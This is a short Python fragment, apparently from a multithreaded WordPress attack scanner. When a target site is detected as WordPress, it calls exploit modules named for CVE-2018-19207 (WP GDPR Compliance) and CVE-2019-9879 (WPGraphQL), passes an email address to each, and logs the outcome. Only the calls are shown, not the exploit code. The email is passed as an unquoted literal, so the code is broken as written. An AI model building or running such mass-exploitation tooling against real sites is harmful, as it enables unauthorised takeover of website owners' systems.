...
def MultiThreadScan(site):
    try:
        ...
        if Check_CMs == 'wordpress':
            ...
            Rez(site, i)
            i = CVE_2018_19207wp_gdpr_compliance.Exploit(site, lostalien666@GMX.com)
            Rez(site, i)
            i = CVE_2019_9879wp_graphql.Exploit(site, lostalien666@GMX.com)
            Rez(site, i)
